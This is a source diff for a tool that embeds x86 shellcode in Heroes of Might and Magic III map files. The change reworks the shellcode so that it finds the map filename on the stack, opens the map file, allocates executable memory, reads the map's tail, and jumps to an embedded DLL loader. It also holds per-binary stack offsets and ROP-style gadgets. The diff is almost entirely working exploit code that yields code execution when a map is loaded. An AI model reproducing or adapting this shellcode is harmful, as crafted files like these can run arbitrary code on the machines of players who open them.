@@ -58,16 +58,16 @@ static const struct offsets_t * const TARGET_OFFSETS[] = {
 // Extra offsets used in the shellcode
 struct extra_offsets_t {
     uint32_t maps_stack_offset;
-    uint32_t filename_stack_offset;
+    //uint32_t filename_stack_offset; // now use relative from maps_stack_offset
 };
 
 static const struct extra_offsets_t * const TARGET_EXTRA_OFFSETS[] = {
     // Heroes3.exe 78956DFAB3EB8DDF29F6A84CF7AD01EE
     // maps_stack_offset 0x26C, filename_stack_offset 0x288 
-    (struct extra_offsets_t *)"\x6C\x02\x00\x00\x88\x02\x00\x00",
+    (struct extra_offsets_t *)"\x6C\x02\x00\x00", //\x88\x02\x00\x00",
     // Heroes3 HD.exe 56614D31CC6F077C2D511E6AF5619280
     // maps_stack_offset 0x26C, filename_stack_offset 0x288 
-    (struct extra_offsets_t *)"\x8C\x02\x00\x00\xA8\x02\x00\x00"
+    (struct extra_offsets_t *)"\x6C\x02\x00\x00", //\xA8\x02\x00\x00"
     // h3demo.exe 522B6F45F534058D02A561838559B1F4
     // TODO retrieve
 };
@@ -132,23 +132,21 @@ static const struct iat_t * const TARGET_IATS[] = {
 };
 
 struct shellcode_oa_jmp_to_dll_load_t {
-    uint8_t c1_1[11];
-    uint32_t maps_stack_offset;
-    uint8_t c1_2[3];
+    uint8_t c0_0[8];
+    uint16_t maps_stack_offset;
+    uint8_t c0_1[16];
     uint32_t SetCurrentDirectoryA;
-    uint8_t c1_3[18];
-    uint32_t filename_stack_offset;
-    uint8_t c1_4[3];
+    uint8_t c1_0[23];
     uint32_t CreateFileA;
-    uint8_t c1_5[10];
+    uint8_t c1_1[10];
     uint32_t total_file_size;
-    uint8_t c1_6[5];
+    uint8_t c1_2[5];
     uint32_t VirtualAlloc;
-    uint8_t c1_7[2];
+    uint8_t c1_3[2];
     uint32_t shellcode_eof_offset;
-    uint8_t c1_8[2];
+    uint8_t c1_4[23];
     uint32_t ReadFile;
-    uint8_t c2[35]; // includes c3, j2 up to ss
+    uint8_t c2[8]; // includes c3, j2 up to ss
     uint32_t call_esp_gadget;
     uint32_t anticrash_gadget1;
     uint32_t anticrash_gadget2;
@@ -157,30 +155,36 @@ struct shellcode_oa_jmp_to_dll_load_t {
 
 // This shellcode is put inside the OA section and jmps to DLL LOAD at EOF
 static const uint8_t SHELLCODE_OA_JMP_TO_DLL_LOAD[] = {
-        0xCC, 0xCC, 0xCC,                           // UNUSED
-/*c1:*/ 0x8D, 0x64, 0xE4, 0x80,                     // LEA ESP, [ESP - 80]
+        0xCC,                                       // UNUSED
+/*c0:*/ 0x8D, 0x64, 0xE4, 0x80,                     // LEA ESP, [ESP - 80]
         0x60,                                       // PUSHAD
-        0x8B, 0x84, 0xE4, 0x12, 0x34, 0x56, 0x78,   // MOV EAX, DWORD PTR SS : [ESP + 0x12345678] ; str "", relative pos on stack
-        0x50,                                       // PUSH EAX
-        0xFF, 0x15, 0x12, 0x34, 0x56, 0x78,         // CALL DWORD PTR DS : [<&KeRNeL32.SetCurrentDirectoryA>]
-        0x6A, 0x00,                                 // PUSH 0
-        0x6A, 0x00,                                 // PUSH 0
+        0x66, 0xBF, 0x6C, 0x02,                     // MOV DI, 26C
+        0x8B, 0x04, 0x3C,                           // MOV EAX, DWORD PTR SS:[EDI+ESP]
+        0x3C, 0x4C,                                 // CMP AL, 4C
+        0x75, 0x06,                                 // JNE SHORT <+7> ; jumps to c1
+        0x83, 0xC7, 0x20,                           // ADD EDI,20
+        0x8B, 0x04, 0x3C,                           // MOV EAX,DWORD PTR SS:[EDI+ESP]
+/*c1:*/ 0x50,                                       // PUSH EAX
+        0xFF, 0x15, 0x04, 0xA2, 0x63, 0x00,         // CALL DWORD PTR DS:[<&KeRNeL32.SetCurrentDirectoryA>]
+        0x31, 0xDB,                                 // XOR EBX,EBX
+        0x53,                                       // PUSH EBX
+        0x53,                                       // PUSH EBX
         0x6A, 0x03,                                 // PUSH 3
-        0x6A, 0x00,                                 // PUSH 0
+        0x53,                                       // PUSH EBX
         0x6A, 0x03,                                 // PUSH 3
         0x68, 0x00, 0x00, 0x00, 0x80,               // PUSH 80000000
-        0x8B, 0x84, 0xE4, 0x12, 0x34, 0x56, 0x78,   // MOV EAX, DWORD PTR SS : [ESP + 0x12345678] ; str "<map name>", relative pos on stack
+        0x83, 0xC7, 0x1C,                           // ADD EDI,1C
+        0x8B, 0x04, 0x3C,                           // MOV EAX,DWORD PTR SS:[EDI+ESP]
         0x50,                                       // PUSH EAX
-        0xFF, 0x15, 0x12, 0x34, 0x56, 0x78,         // CALL DWORD PTR DS : [<&KeRNeL32.CreateFileA>]
+        0xFF, 0x15, 0x08, 0xA1, 0x63, 0x00,         // CALL DWORD PTR DS : [<&KeRNeL32.CreateFileA>]
         0x89, 0xC3,                                 // MOV EBX, EAX
         0x6A, 0x40,                                 // PUSH 40
         0x68, 0x00, 0x10, 0x00, 0x00,               // PUSH 1000
         0xBF, 0x12, 0x34, 0x56, 0x78,               // MOV EDI, 0x12345678 ; total_file_size
         0x57,                                       // PUSH EDI
         0x6A, 0x00,                                 // PUSH 0
-        0xFF, 0x15, 0x12, 0x34, 0x56, 0x78,         // CALL DWORD PTR DS : [<&KeRNeL32.VirtualAlloc>] ; TODO free
+        0xFF, 0x15, 0x48, 0xA1, 0x63, 0x00,         // CALL DWORD PTR DS : [<&KeRNeL32.VirtualAlloc>]
         0x8D, 0xA8, 0x12, 0x34, 0x56, 0x78,         // LEA EBP, [EAX + 0x12345678] ; shellcode_eof_offset
-        0x8B, 0x35, 0x12, 0x34, 0x56, 0x78,         // MOV ESI, DWORD PTR DS : [<&KeRNeL32.ReadFile>]
         0x6A, 0x00,                                 // PUSH 0
         0x54,                                       // PUSH ESP
         0x57,                                       // PUSH EDI
@@ -189,11 +193,13 @@ static const uint8_t SHELLCODE_OA_JMP_TO_DLL_LOAD[] = {
         0xCC, 0xCC, 0xCC, 0xCC,                     // ; GARBAGE, game trashes these bytes
 /*c2:*/ 0x53,                                       // PUSH EBX
         0xEB, 0x07,                                 // JS c3 <+0x07> ; jumps to c3
-        0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,   // ; GARBAGE, game trashes these bytes
-/*c3:*/ 0xFF, 0xD6,                                 // CALL ESI ; Call [<&KeRNeL32.ReadFile>]
-        0xFF, 0xE5,                                 // JMP EBP ; jump to desc shellcode
-        0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,   // ; GARBAGE, game trashes these bytes
-/*j2:*/ 0xEB, 0x8B,                                 // JS c1 <-0x72> ; j2, jumps to c1
+        0xCC,                                       // UNUSED
+        0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,         // ; GARBAGE, game trashes these bytes
+        0xFF, 0x15, 0xF4, 0xA0, 0x63, 0x00,         // CALL DWORD PTR DS : [<&KeRNeL32.ReadFile>]
+        0xFF, 0xE5,                                 // JMP EBP
+        0xCC, 0xCC,                                 // ; GARBAGE, game trashes these bytes
+        0xCC,                                       // UNUSED
+/*j2:*/ 0xEB, 0x89,                                 // JS c1 <-0x76> ; j2, jumps to c0
         0xCC,                                       // UNUSED
 /*ss:*/ 0x12, 0x34, 0x56, 0x78,                     // db 0x12345678 ; CALL ESP-gadget
         0x12, 0x34, 0x56, 0x78,                     // db 0x12345678 ; anticrash_gadget1
@@ -443,7 +449,7 @@ int h3m_modembed_write_oa_eof_jmp(struct H3M_MODEMBED *hm, uint32_t oa_count, ui
     shellcode_oa->anticrash_gadget1 = ofs->anticrash_gadget1;
     shellcode_oa->anticrash_gadget2 = ofs->anticrash_gadget2;
     // Stack offsets to strings on stack
-    shellcode_oa->filename_stack_offset = sofs->filename_stack_offset;
+    //shellcode_oa->filename_stack_offset = sofs->filename_stack_offset;
     shellcode_oa->maps_stack_offset = sofs->maps_stack_offset;
     fwrite(shellcode_oa, 1, sizeof(*shellcode_oa), f);
 
